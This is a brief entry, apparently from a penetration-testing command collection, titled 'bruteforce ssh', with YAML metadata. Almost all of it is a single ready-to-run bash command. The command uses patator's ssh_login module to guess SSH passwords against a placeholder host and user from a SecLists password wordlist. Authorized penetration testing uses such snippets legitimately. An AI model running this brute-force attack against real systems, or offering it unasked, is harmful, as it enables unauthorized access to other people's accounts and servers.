---
id: 07775cff-05b9-4848-b16c-26716819dcc1
name: bruteforce ssh
type: command
executor: bash
data: 'patator ssh_login host=target-ip port=22 user=username password=FILE0 0=/opt/SecLists/Passwords/probable-v2-top1575.txt

  '
output: null
created_at: '2020-07-14T18:14:45.856571+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# bruteforce ssh

```bash
patator ssh_login host=target-ip port=22 user=username password=FILE0 0=/opt/SecLists/Passwords/probable-v2-top1575.txt

```
